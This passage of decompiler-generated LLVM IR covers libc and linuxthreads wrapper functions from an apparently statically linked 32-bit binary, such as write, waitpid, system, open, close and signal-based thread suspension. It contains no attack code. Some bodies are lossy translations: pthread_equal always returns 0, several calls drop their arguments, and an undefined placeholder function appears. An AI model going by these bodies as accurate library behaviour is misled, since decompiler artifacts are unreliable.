  %v2_10003334 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268448580, i32* @lr, align 4
  %v3_10003340 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_10003334)
  store i32 268448596, i32* @lr, align 4
  %v3_10003350 = call i32 @__libc_accept(i32 %arg1, i32 %arg2, i32 %arg3)
  %v3_1000335c = load i32, i32* %stack_var_-40, align 4
  store i32 268448612, i32* @lr, align 4
  %v2_10003360 = trunc i32 %v3_1000335c to i8
  %v3_10003360 = call i32 @__GI_pthread_setcanceltype(i8 %v2_10003360, i32 0)
  ret i32 %v3_10003350
}

define i32 @write(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_10003394 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268448676, i32* @lr, align 4
  %v3_100033a0 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_10003394)
  store i32 268448692, i32* @lr, align 4
  %v2_100033b0 = call i32 @__libc_write(i32 %arg1, i32 %arg2)
  %v3_100033bc = load i32, i32* %stack_var_-40, align 4
  store i32 268448708, i32* @lr, align 4
  %v2_100033c0 = trunc i32 %v3_100033bc to i8
  %v3_100033c0 = call i32 @__GI_pthread_setcanceltype(i8 %v2_100033c0, i32 0)
  ret i32 %v2_100033b0
}

define i32 @waitpid(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_100033f4 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268448772, i32* @lr, align 4
  %v3_10003400 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_100033f4)
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 268448788, i32* @lr, align 4
  %v3_10003410 = call i32 @__libc_waitpid(i32 %arg1, i32 %arg2, i32 %arg3)
  %v3_1000341c = load i32, i32* %stack_var_-40, align 4
  store i32 268448804, i32* @lr, align 4
  %v2_10003420 = trunc i32 %v3_1000341c to i8
  %v3_10003420 = call i32 @__GI_pthread_setcanceltype(i8 %v2_10003420, i32 0)
  ret i32 %v3_10003410

; uselistorder directives
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
}

define i32 @wait(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_10003448 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268448860, i32* @lr, align 4
  %v3_10003458 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_10003448)
  store i32 268448868, i32* @lr, align 4
  %v1_10003460 = call i32 @__libc_wait(i32 %arg1)
  %v3_1000346c = load i32, i32* %stack_var_-40, align 4
  store i32 268448884, i32* @lr, align 4
  %v2_10003470 = trunc i32 %v3_1000346c to i8
  %v3_10003470 = call i32 @__GI_pthread_setcanceltype(i8 %v2_10003470, i32 0)
  ret i32 %v1_10003460
}

define i32 @tcdrain(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_10003498 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268448940, i32* @lr, align 4
  %v3_100034a8 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_10003498)
  store i32 268448948, i32* @lr, align 4
  %v1_100034b0 = call i32 @__libc_tcdrain(i32 %arg1)
  %v3_100034bc = load i32, i32* %stack_var_-40, align 4
  store i32 268448964, i32* @lr, align 4
  %v2_100034c0 = trunc i32 %v3_100034bc to i8
  %v3_100034c0 = call i32 @__GI_pthread_setcanceltype(i8 %v2_100034c0, i32 0)
  ret i32 %v1_100034b0
}

define i32 @system(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_100034e8 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268449020, i32* @lr, align 4
  %v3_100034f8 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_100034e8)
  store i32 268449028, i32* @lr, align 4
  %v1_10003500 = call i32 @__libc_system(i32 %arg1)
  %v3_1000350c = load i32, i32* %stack_var_-40, align 4
  store i32 268449044, i32* @lr, align 4
  %v2_10003510 = trunc i32 %v3_1000350c to i8
  %v3_10003510 = call i32 @__GI_pthread_setcanceltype(i8 %v2_10003510, i32 0)
  ret i32 %v1_10003500
}

define i32 @read(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_10003544 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268449108, i32* @lr, align 4
  %v3_10003550 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_10003544)
  store i32 268449124, i32* @lr, align 4
  %v1_10003560 = call i32 @__libc_read(i32 %arg1)
  %v3_1000356c = load i32, i32* %stack_var_-40, align 4
  store i32 268449140, i32* @lr, align 4
  %v2_10003570 = trunc i32 %v3_1000356c to i8
  %v3_10003570 = call i32 @__GI_pthread_setcanceltype(i8 %v2_10003570, i32 0)
  ret i32 %v1_10003560
}

define i32 @pwrite(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r29.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  store i32 %arg1, i32* %r29.global-to-local, align 4
  %v2_100035a8 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268449208, i32* @lr, align 4
  %v3_100035b4 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_100035a8)
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg4, i32* @r6, align 4
  %v0_100035c4 = load i32, i32* %r29.global-to-local, align 4
  store i32 268449228, i32* @lr, align 4
  %v4_100035c8 = call i32 @__libc_pwrite(i32 %v0_100035c4, i32 %arg2, i32 %arg3, i32 %arg4)
  store i32 %v4_100035c8, i32* %r29.global-to-local, align 4
  %v3_100035d4 = load i32, i32* %stack_var_-40, align 4
  store i32 268449244, i32* @lr, align 4
  %v2_100035d8 = trunc i32 %v3_100035d4 to i8
  %v3_100035d8 = call i32 @__GI_pthread_setcanceltype(i8 %v2_100035d8, i32 0)
  ret i32 %v4_100035c8

; uselistorder directives
  uselistorder i32 %arg4, { 1, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
}

define i32 @pread64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r25.global-to-local = alloca i32, align 4
  %r26.global-to-local = alloca i32, align 4
  %r27.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  store i32 %arg1, i32* %r27.global-to-local, align 4
  store i32 %arg2, i32* %r26.global-to-local, align 4
  store i32 %arg3, i32* %r25.global-to-local, align 4
  store i32 %arg5, i32* %r29.global-to-local, align 4
  store i32 %arg4, i32* %r28.global-to-local, align 4
  %v2_10003614 = ptrtoint i32* %stack_var_-56 to i32
  store i32 268449316, i32* @lr, align 4
  %v3_10003620 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_10003614)
  %v0_10003624 = load i32, i32* %r26.global-to-local, align 4
  store i32 %v0_10003624, i32* @r4, align 4
  %v0_10003628 = load i32, i32* %r25.global-to-local, align 4
  store i32 %v0_10003628, i32* @r5, align 4
  %v0_1000362c = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_1000362c, i32* @r7, align 4
  %v0_10003630 = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_10003630, i32* @r8, align 4
  %v0_10003634 = load i32, i32* %r27.global-to-local, align 4
  store i32 268449340, i32* @lr, align 4
  %v5_10003638 = call i32 @__libc_pread64(i32 %v0_10003634, i32 %v0_10003624, i32 %v0_10003628, i32 %v0_1000362c, i32 %v0_10003630)
  store i32 %v5_10003638, i32* %r29.global-to-local, align 4
  %v3_10003644 = load i32, i32* %stack_var_-56, align 4
  store i32 268449356, i32* @lr, align 4
  %v2_10003648 = trunc i32 %v3_10003644 to i8
  %v3_10003648 = call i32 @__GI_pthread_setcanceltype(i8 %v2_10003648, i32 0)
  ret i32 %v5_10003638
}

define i32 @pread(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r29.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  store i32 %arg1, i32* %r29.global-to-local, align 4
  %v2_10003680 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268449424, i32* @lr, align 4
  %v3_1000368c = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_10003680)
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg4, i32* @r6, align 4
  %v0_1000369c = load i32, i32* %r29.global-to-local, align 4
  store i32 268449444, i32* @lr, align 4
  %v4_100036a0 = call i32 @__libc_pread(i32 %v0_1000369c, i32 %arg2, i32 %arg3, i32 %arg4)
  store i32 %v4_100036a0, i32* %r29.global-to-local, align 4
  %v3_100036ac = load i32, i32* %stack_var_-40, align 4
  store i32 268449460, i32* @lr, align 4
  %v2_100036b0 = trunc i32 %v3_100036ac to i8
  %v3_100036b0 = call i32 @__GI_pthread_setcanceltype(i8 %v2_100036b0, i32 0)
  ret i32 %v4_100036a0

; uselistorder directives
  uselistorder i32 %arg4, { 1, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
}

define i32 @pause() local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_100036d8 = ptrtoint i32* %stack_var_-40 to i32
  store i32 ptrtoint (i32* @global_var_100036e8.121 to i32), i32* @lr, align 4
  %v3_100036e4 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_100036d8)
  store i32 268449516, i32* @lr, align 4
  %v1_100036e8 = call i32 @__libc_pause(i32 %v3_100036e4)
  %v3_100036f4 = load i32, i32* %stack_var_-40, align 4
  store i32 268449532, i32* @lr, align 4
  %v2_100036f8 = trunc i32 %v3_100036f4 to i8
  %v3_100036f8 = call i32 @__GI_pthread_setcanceltype(i8 %v2_100036f8, i32 0)
  ret i32 %v1_100036e8
}

define i32 @open64(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_1000372c = ptrtoint i32* %stack_var_-40 to i32
  store i32 268449596, i32* @lr, align 4
  %v3_10003738 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_1000372c)
  store i32 268449640, i32* @lr, align 4
  %v3_10003764 = call i32 @__GI___libc_open64(i32 %arg1, i32 %arg2, i32 %arg3)
  %v3_1000376c = load i32, i32* %stack_var_-40, align 4
  store i32 268449656, i32* @lr, align 4
  %v2_10003774 = trunc i32 %v3_1000376c to i8
  %v3_10003774 = call i32 @__GI_pthread_setcanceltype(i8 %v2_10003774, i32 0)
  ret i32 %v3_10003764
}

define i32 @open(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_100037a8 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268449720, i32* @lr, align 4
  %v3_100037b4 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_100037a8)
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg2, i32* @r4, align 4
  store i32 268449764, i32* @lr, align 4
  %v0_100037e0 = call i32 @__libc_open()
  %v3_100037e8 = load i32, i32* %stack_var_-40, align 4
  store i32 268449780, i32* @lr, align 4
  %v2_100037f0 = trunc i32 %v3_100037e8 to i8
  %v3_100037f0 = call i32 @__GI_pthread_setcanceltype(i8 %v2_100037f0, i32 0)
  ret i32 %v0_100037e0
}

define i32 @nanosleep(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  store i32 %arg2, i32* @r28, align 4
  %v2_10003824 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268449840, i32* @lr, align 4
  %v3_1000382c = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_10003824)
  store i32 268449852, i32* @lr, align 4
  %v0_10003838 = call i32 @__libc_nanosleep()
  store i32 %v0_10003838, i32* @r29, align 4
  %v3_10003844 = load i32, i32* %stack_var_-40, align 4
  store i32 268449868, i32* @lr, align 4
  %v2_10003848 = trunc i32 %v3_10003844 to i8
  %v3_10003848 = call i32 @__GI_pthread_setcanceltype(i8 %v2_10003848, i32 0)
  %v0_10003850 = load i32, i32* @r29, align 4
  ret i32 %v0_10003850
}

define i32 @msync(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_1000387c = ptrtoint i32* %stack_var_-40 to i32
  store i32 268449932, i32* @lr, align 4
  %v3_10003888 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_1000387c)
  store i32 268449948, i32* @lr, align 4
  %v3_10003898 = call i32 @__libc_msync(i32 %arg1, i32 %arg2, i32 %arg3)
  %v3_100038a4 = load i32, i32* %stack_var_-40, align 4
  store i32 268449964, i32* @lr, align 4
  %v2_100038a8 = trunc i32 %v3_100038a4 to i8
  %v3_100038a8 = call i32 @__GI_pthread_setcanceltype(i8 %v2_100038a8, i32 0)
  ret i32 %v3_10003898
}

define i32 @lseek64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_100038d0 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268450032, i32* @lr, align 4
  %v3_100038ec = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_100038d0)
  store i32 268450052, i32* @lr, align 4
  %v4_10003900 = call i32 @__libc_lseek64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4)
  %v3_10003908 = load i32, i32* %stack_var_-40, align 4
  store i32 268450072, i32* @lr, align 4
  %v2_10003914 = trunc i32 %v3_10003908 to i8
  %v3_10003914 = call i32 @__GI_pthread_setcanceltype(i8 %v2_10003914, i32 0)
  ret i32 %v4_10003900
}

define i32 @lseek(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_1000394c = ptrtoint i32* %stack_var_-40 to i32
  store i32 268450140, i32* @lr, align 4
  %v3_10003958 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_1000394c)
  store i32 268450156, i32* @lr, align 4
  %v3_10003968 = call i32 @__GI___libc_lseek(i32 %arg1, i32 %arg2, i32 %arg3)
  %v3_10003974 = load i32, i32* %stack_var_-40, align 4
  store i32 268450172, i32* @lr, align 4
  %v2_10003978 = trunc i32 %v3_10003974 to i8
  %v3_10003978 = call i32 @__GI_pthread_setcanceltype(i8 %v2_10003978, i32 0)
  ret i32 %v3_10003968
}

define i32 @fsync(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_100039a0 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268450228, i32* @lr, align 4
  %v3_100039b0 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_100039a0)
  store i32 268450236, i32* @lr, align 4
  %v1_100039b8 = call i32 @__libc_fsync(i32 %arg1)
  %v3_100039c4 = load i32, i32* %stack_var_-40, align 4
  store i32 268450252, i32* @lr, align 4
  %v2_100039c8 = trunc i32 %v3_100039c4 to i8
  %v3_100039c8 = call i32 @__GI_pthread_setcanceltype(i8 %v2_100039c8, i32 0)
  ret i32 %v1_100039b8
}

define i32 @fcntl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_100039fc = ptrtoint i32* %stack_var_-40 to i32
  store i32 268450316, i32* @lr, align 4
  %v3_10003a08 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_100039fc)
  store i32 268450360, i32* @lr, align 4
  %v2_10003a34 = call i32 @__libc_fcntl(i32 %arg1, i32 %arg2)
  %v3_10003a3c = load i32, i32* %stack_var_-40, align 4
  store i32 268450376, i32* @lr, align 4
  %v2_10003a44 = trunc i32 %v3_10003a3c to i8
  %v3_10003a44 = call i32 @__GI_pthread_setcanceltype(i8 %v2_10003a44, i32 0)
  ret i32 %v2_10003a34
}

define i32 @close(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_10003a6c = ptrtoint i32* %stack_var_-40 to i32
  store i32 268450432, i32* @lr, align 4
  %v3_10003a7c = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_10003a6c)
  store i32 268450440, i32* @lr, align 4
  %v1_10003a84 = call i32 @__libc_close(i32 %arg1)
  %v3_10003a90 = load i32, i32* %stack_var_-40, align 4
  store i32 268450456, i32* @lr, align 4
  %v2_10003a94 = trunc i32 %v3_10003a90 to i8
  %v3_10003a94 = call i32 @__GI_pthread_setcanceltype(i8 %v2_10003a94, i32 0)
  ret i32 %v1_10003a84

; uselistorder directives
  uselistorder i32 (i8, i32)* @__GI_pthread_setcanceltype, { 44, 45, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 52, 53, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 36, 37, 50, 51, 46, 47, 40, 41, 48, 49, 30, 31, 32, 33, 42, 43, 34, 35, 38, 39 }
}

define i32 @__libc_current_sigrtmin() local_unnamed_addr {
entry:
  %v3_10003ab4 = load i32, i32* getelementptr inbounds ([3 x i32], [3 x i32]* @global_var_10027ef8.122, i32 0, i32 0), align 4
  ret i32 %v3_10003ab4
}

define i32 @__libc_current_sigrtmax() local_unnamed_addr {
entry:
  %v3_10003ac0 = load i32, i32* @global_var_10027efc.123, align 4
  ret i32 %v3_10003ac0
}

define i32 @__libc_allocate_rtsig(i32 %arg1) local_unnamed_addr {
entry:
  %v3_10003ad0 = load i32, i32* getelementptr inbounds ([3 x i32], [3 x i32]* @global_var_10027ef8.122, i32 0, i32 0), align 4
  %v3_10003ad4 = icmp eq i32 %v3_10003ad0, -1
  br i1 %v3_10003ad4, label %dec_label_pc_10003b0c, label %dec_label_pc_10003adc

dec_label_pc_10003adc:                            ; preds = %entry
  %v3_10003adc = load i32, i32* @global_var_10027efc.123, align 4
  %v3_10003ae4 = icmp sgt i32 %v3_10003ad0, %v3_10003adc
  br i1 %v3_10003ae4, label %dec_label_pc_10003b0c, label %dec_label_pc_10003aec

dec_label_pc_10003aec:                            ; preds = %dec_label_pc_10003adc
  %v3_10003ae0 = icmp eq i32 %arg1, 0
  br i1 %v3_10003ae0, label %dec_label_pc_10003b00, label %dec_label_pc_10003af8

dec_label_pc_10003af8:                            ; preds = %dec_label_pc_10003aec
  %v1_10003aec = add i32 %v3_10003ad0, 1
  store i32 %v1_10003aec, i32* getelementptr inbounds ([3 x i32], [3 x i32]* @global_var_10027ef8.122, i32 0, i32 0), align 4
  br label %dec_label_pc_10003b10

dec_label_pc_10003b00:                            ; preds = %dec_label_pc_10003aec
  %v1_10003af0 = add i32 %v3_10003adc, -1
  store i32 %v1_10003af0, i32* @global_var_10027efc.123, align 4
  br label %dec_label_pc_10003b10

dec_label_pc_10003b0c:                            ; preds = %dec_label_pc_10003adc, %entry
  br label %dec_label_pc_10003b10

dec_label_pc_10003b10:                            ; preds = %dec_label_pc_10003b00, %dec_label_pc_10003af8, %dec_label_pc_10003b0c
  %v0_10003b10 = phi i32 [ %v3_10003adc, %dec_label_pc_10003b00 ], [ %v3_10003ad0, %dec_label_pc_10003af8 ], [ -1, %dec_label_pc_10003b0c ]
  ret i32 %v0_10003b10

; uselistorder directives
  uselistorder label %dec_label_pc_10003b10, { 2, 0, 1 }
}

define i32 @__GI_pthread_self() local_unnamed_addr {
entry:
  %v0_10003b18 = load i32, i32* @r2, align 4
  %v1_10003b18 = add i32 %v0_10003b18, 16
  %v2_10003b18 = inttoptr i32 %v1_10003b18 to i32*
  %v3_10003b18 = load i32, i32* %v2_10003b18, align 4
  ret i32 %v3_10003b18
}

define i32 @pthread_equal(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @pthread_handle_sigdebug() local_unnamed_addr {
entry:
  %v0_10003b30 = load i32, i32* @r3, align 4
  ret i32 %v0_10003b30
}

define i32 @__pthread_setconcurrency(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @global_var_1002c340.124, align 4
  ret i32 0
}

define i32 @__pthread_getconcurrency() local_unnamed_addr {
entry:
  %v3_10003b48 = load i32, i32* @global_var_1002c340.124, align 4
  ret i32 %v3_10003b48
}

define i32 @__pthread_timedsuspend_new(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-904 = alloca i32, align 4
  %stack_var_-760 = alloca i32, align 4
  %stack_var_-888 = alloca i32, align 4
  %stack_var_-624 = alloca i32, align 4
  store i32 1, i32* @r4, align 4
  store i32 268450676, i32* @lr, align 4
  %v3_10003b70 = call i32 @__sigsetjmp(i32* nonnull %stack_var_-624, i32 1)
  %v3_10003b74 = icmp eq i32 %v3_10003b70, 0
  store i32 1, i32* %r9.global-to-local, align 4
  br i1 %v3_10003b74, label %dec_label_pc_10003b80, label %entry.dec_label_pc_10003c40_crit_edge

entry.dec_label_pc_10003c40_crit_edge:            ; preds = %entry
  %.pre = add i32 %arg1, 36
  %.pre1 = inttoptr i32 %.pre to i32*
  br label %dec_label_pc_10003c40

dec_label_pc_10003b80:                            ; preds = %entry
  %v2_10003b5c = ptrtoint i32* %stack_var_-624 to i32
  store i32 %arg1, i32* %r9.global-to-local, align 4
  %v2_10003b88 = ptrtoint i32* %stack_var_-888 to i32
  store i32 %v2_10003b88, i32* @r29, align 4
  %v2_10003b8c = add i32 %arg1, 36
  %v3_10003b8c = inttoptr i32 %v2_10003b8c to i32*
  store i32 %v2_10003b5c, i32* %v3_10003b8c, align 4
  %v1_10003b90 = load i32, i32* %r9.global-to-local, align 4
  %v2_10003b90 = add i32 %v1_10003b90, 32
  %v3_10003b90 = inttoptr i32 %v2_10003b90 to i32*
  store i32 0, i32* %v3_10003b90, align 4
  store i32 268450716, i32* @lr, align 4
  %v1_10003b98 = call i32 @sigemptyset(i32 %v2_10003b88)
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* %r9.global-to-local, align 4
  %v3_10003ba0 = load i32, i32* @global_var_1002c278.125, align 4
  store i32 %v2_10003b88, i32* @r3, align 4
  store i32 268450732, i32* @lr, align 4
  %v2_10003ba8 = call i32 @__GI_sigaddset(i32 %v2_10003b88, i32 %v3_10003ba0)
  %v2_10003bb4 = ptrtoint i32* %stack_var_-760 to i32
  store i32 268450748, i32* @lr, align 4
  %v3_10003bb8 = call i32 @__GI_sigprocmask(i32 1, i32 %v2_10003b88, i32 %v2_10003bb4)
  %v2_10003bc0 = ptrtoint i32* %stack_var_-904 to i32
  %v1_10003bdc = add i32 %tmp, 4
  %v2_10003bdc = inttoptr i32 %v1_10003bdc to i32*
  br label %dec_label_pc_10003bbc

dec_label_pc_10003bbc:                            ; preds = %dec_label_pc_10003c20, %dec_label_pc_10003b80
  store i32 268450760, i32* @lr, align 4
  %v2_10003bc4 = call i32 @gettimeofday(i32 %v2_10003bc0, i32 0)
  store i32 %tmp, i32* %r9.global-to-local, align 4
  %v3_10003bdc = load i32, i32* %v2_10003bdc, align 4
  %v2_10003be0 = load i32, i32* %arg2, align 4
  %tmp16 = mul i32 %tmp4, -1000
  %v2_10003be4 = add i32 %v3_10003bdc, %tmp16
  store i32 %v2_10003be4, i32* @r11, align 4
  %v3_10003be8 = load i32, i32* %stack_var_-904, align 4
  %v2_10003bf4 = sub i32 %v2_10003be0, %v3_10003be8
  store i32 %v2_10003bf4, i32* %r9.global-to-local, align 4
  %not.tmp15 = icmp slt i32 %v2_10003be4, 0
  %v1_10003bfc = sext i1 %not.tmp15 to i32
  %v2_10003bf4.v1_10003bfc = add i32 %v2_10003bf4, %v1_10003bfc
  %v1_10003c18 = icmp slt i32 %v2_10003bf4.v1_10003bfc, 0
  br i1 %v1_10003c18, label %dec_label_pc_10003c2c, label %dec_label_pc_10003c20

dec_label_pc_10003c20:                            ; preds = %dec_label_pc_10003bbc
  store i32 268450852, i32* @lr, align 4
  %v0_10003c20 = call i32 @__libc_nanosleep()
  %v3_10003c24 = icmp eq i32 %v0_10003c20, 0
  br i1 %v3_10003c24, label %dec_label_pc_10003c2c, label %dec_label_pc_10003bbc

dec_label_pc_10003c2c:                            ; preds = %dec_label_pc_10003c20, %dec_label_pc_10003bbc
  store i32 ptrtoint ([3 x i8]* @global_var_10003c3c.126 to i32), i32* @lr, align 4
  %v3_10003c38 = call i32 @__GI_sigprocmask(i32 2, i32 %v2_10003bb4, i32 0)
  store i32 0, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10003c40

dec_label_pc_10003c40:                            ; preds = %entry.dec_label_pc_10003c40_crit_edge, %dec_label_pc_10003c2c
  %v3_10003c48.pre-phi = phi i32* [ %.pre1, %entry.dec_label_pc_10003c40_crit_edge ], [ %v3_10003b8c, %dec_label_pc_10003c2c ]
  store i32 %arg1, i32* @r10, align 4
  store i32 0, i32* %v3_10003c48.pre-phi, align 4
  %v0_10003c54 = load i32, i32* %r9.global-to-local, align 4
  ret i32 %v0_10003c54

; uselistorder directives
  uselistorder i32 %v2_10003be4, { 1, 0 }
  uselistorder i32 %v2_10003b88, { 0, 2, 1, 3, 4 }
  uselistorder i32* %stack_var_-624, { 1, 0 }
  uselistorder i32* %r9.global-to-local, { 6, 0, 1, 2, 5, 3, 4, 7 }
  uselistorder i32 ()* @__libc_nanosleep, { 1, 0 }
  uselistorder i32 %arg1, { 1, 3, 2, 0 }
  uselistorder label %dec_label_pc_10003c40, { 1, 0 }
}

define i32 @__pthread_restart_new() local_unnamed_addr {
entry:
  %v0_10003c7c = load i32, i32* @r3, align 4
  %v1_10003c7c = add i32 %v0_10003c7c, 20
  %v2_10003c7c = inttoptr i32 %v1_10003c7c to i32*
  %v3_10003c7c = load i32, i32* %v2_10003c7c, align 4
  %v3_10003c80 = load i32, i32* @global_var_1002c278.125, align 4
  store i32 268450952, i32* @lr, align 4
  %v2_10003c84 = call i32 @kill(i32 %v3_10003c7c, i32 %v3_10003c80)
  ret i32 %v2_10003c84
}

define i32 @__pthread_wait_for_restart_signal() local_unnamed_addr {
entry:
  %stack_var_-152 = alloca i32, align 4
  %v2_10003ca8 = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_10003ca8, i32* @r29, align 4
  %v0_10003cac = load i32, i32* @r3, align 4
  store i32 %v0_10003cac, i32* @r31, align 4
  store i32 268451008, i32* @lr, align 4
  %v3_10003cbc = call i32 @__GI_sigprocmask(i32 2, i32 0, i32 %v2_10003ca8)
  store i32 %v2_10003ca8, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_10003cd0.127 to i32), i32* @lr, align 4
  %v1_10003ccc = call i32 @__GI_sigdelset(i32 %v2_10003ca8)
  %v1_10003cd4 = load i32, i32* @r31, align 4
  %v2_10003cd4 = add i32 %v1_10003cd4, 32
  %v3_10003cd4 = inttoptr i32 %v2_10003cd4 to i32*
  store i32 0, i32* %v3_10003cd4, align 4
  br label %dec_label_pc_10003cd8

dec_label_pc_10003cd8:                            ; preds = %dec_label_pc_10003cd8, %entry
  store i32 268451040, i32* @lr, align 4
  %v1_10003cdc = call i32 @__libc_sigsuspend(i32 %v2_10003ca8)
  %v3_10003ce4 = load i32, i32* @global_var_1002c278.125, align 4
  store i32 %v3_10003ce4, i32* @r9, align 4
  %v0_10003ce8 = load i32, i32* @r31, align 4
  %v1_10003ce8 = add i32 %v0_10003ce8, 32
  %v2_10003ce8 = inttoptr i32 %v1_10003ce8 to i32*
  %v3_10003ce8 = load i32, i32* %v2_10003ce8, align 4
  %v4_10003cec = icmp eq i32 %v3_10003ce8, %v3_10003ce4
  br i1 %v4_10003cec, label %dec_label_pc_10003cf4, label %dec_label_pc_10003cd8

dec_label_pc_10003cf4:                            ; preds = %dec_label_pc_10003cd8
  ret i32 %v1_10003cdc

; uselistorder directives
  uselistorder i32 %v2_10003ca8, { 1, 3, 2, 0, 4 }
}

define i32 @suspend(i32 %arg1) local_unnamed_addr {
entry:
  %v0_10003d0c = call i32 @__pthread_wait_for_restart_signal()
  ret i32 %v0_10003d0c
}

define i32 @pthread_onexit_process(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-168 = alloca i32, align 4
  %v0_10003d20 = load i32, i32* @r2, align 4
  store i32 %v0_10003d20, i32* @r31, align 4
  %v3_10003d28 = load i32, i32* @global_var_1002c258.128, align 4
  %v1_10003d2c = icmp slt i32 %v3_10003d28, 0
  br i1 %v1_10003d2c, label %entry.dec_label_pc_10003db0_crit_edge, label %dec_label_pc_10003d34

entry.dec_label_pc_10003db0_crit_edge:            ; preds = %entry
  %v0_10003dc0.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10003db0

dec_label_pc_10003d34:                            ; preds = %entry
  store i32 %v0_10003d20, i32* %stack_var_-168, align 4
  %v2_10003d48 = ptrtoint i32* %stack_var_-168 to i32
  store i32 %v3_10003d28, i32* %r3.global-to-local, align 4
  store i32 268451160, i32* @lr, align 4
